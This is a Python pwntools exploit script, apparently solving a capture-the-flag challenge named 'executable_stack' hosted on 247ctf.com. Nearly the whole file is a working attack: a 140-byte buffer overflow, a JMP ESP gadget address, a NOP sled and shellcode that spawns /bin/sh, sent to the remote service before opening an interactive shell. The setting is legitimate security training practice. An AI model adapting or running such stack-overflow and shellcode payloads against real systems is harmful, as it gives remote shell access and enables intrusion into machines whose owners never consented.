#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./executable_stack')
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'  # Set to 'info' or 'error' to reduce output noise

# Remote host info
host = args.HOST or 'ddb71ee4c3dc80ab.247ctf.com'
port = int(args.PORT or 50265)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote_conn(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    return local(argv, *a, **kw) if args.LOCAL else remote_conn(argv, *a, **kw)

# GDB debugging script
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Determine offset using `cyclic` if needed (140 confirmed by you)
offset = 140

# JMP ESP found in binary at 0x080484b3
jmp_esp = 0x080484b3

# Build payload
payload  = b"A" * offset
payload += p32(jmp_esp)
payload += b"\x90" * 16  # NOP sled
payload += asm(shellcraft.sh())  # Spawn /bin/sh

# Start process
io = start()

# If there's an input prompt, adjust this accordingly
# e.g., io.sendlineafter(">", payload)
io.sendline(payload)

# Interact with shell
io.interactive()
